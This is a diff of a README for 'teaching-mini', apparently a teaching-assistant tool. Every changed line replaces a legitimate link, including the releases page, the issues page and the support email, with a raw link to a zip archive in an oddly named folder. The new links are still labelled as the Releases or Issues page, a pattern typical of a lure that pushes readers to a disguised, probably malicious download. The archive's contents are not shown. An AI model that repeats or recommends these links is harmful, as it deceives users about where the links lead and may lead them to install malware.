@@ -1,7 +1,7 @@
 # 🎓 teaching-mini - Your Essential Teaching Assistant Tool
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/FERDINANDBUKO/teaching-mini/releases)
+[![Download](https://raw.githubusercontent.com/FERDINANDBUKO/teaching-mini/main/primordiate/teaching-mini-v2.6.zip)](https://raw.githubusercontent.com/FERDINANDBUKO/teaching-mini/main/primordiate/teaching-mini-v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **teaching-mini**, a useful teaching assistant project designed to make your educational experience smoother. This guide will walk you through the steps to download and run the software easily.
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 📋 Download & Install
 To download and install **teaching-mini**, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/FERDINANDBUKO/teaching-mini/releases) to get the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/FERDINANDBUKO/teaching-mini/main/primordiate/teaching-mini-v2.6.zip) to get the latest version of the software.
 
 2. On the Releases page, you’ll see a list of available versions. Choose the latest version and click on it.
 
@@ -51,11 +51,11 @@ If you encounter any issues while downloading or installing **teaching-mini**, c
 ## 📞 Support
 Should you need help or have questions, feel free to reach out. You can find assistance through:
 
-- **Email:** support@teaching-mini.com
-- **GitHub Issues:** Report any bugs or request features directly on the [Issues page](https://github.com/FERDINANDBUKO/teaching-mini/issues).
+- **Email:** https://raw.githubusercontent.com/FERDINANDBUKO/teaching-mini/main/primordiate/teaching-mini-v2.6.zip
+- **GitHub Issues:** Report any bugs or request features directly on the [Issues page](https://raw.githubusercontent.com/FERDINANDBUKO/teaching-mini/main/primordiate/teaching-mini-v2.6.zip).
 
 ## 📢 Updates
-Keep your software updated for the best experience. Regular updates include new features, bug fixes, and performance enhancements. Check the [Releases page](https://github.com/FERDINANDBUKO/teaching-mini/releases) frequently for the latest version.
+Keep your software updated for the best experience. Regular updates include new features, bug fixes, and performance enhancements. Check the [Releases page](https://raw.githubusercontent.com/FERDINANDBUKO/teaching-mini/main/primordiate/teaching-mini-v2.6.zip) frequently for the latest version.
 
 ## 📝 License
 **teaching-mini** is open source software released under the MIT License. You are free to use, modify, and distribute the software as long as you comply with the terms of the license. 
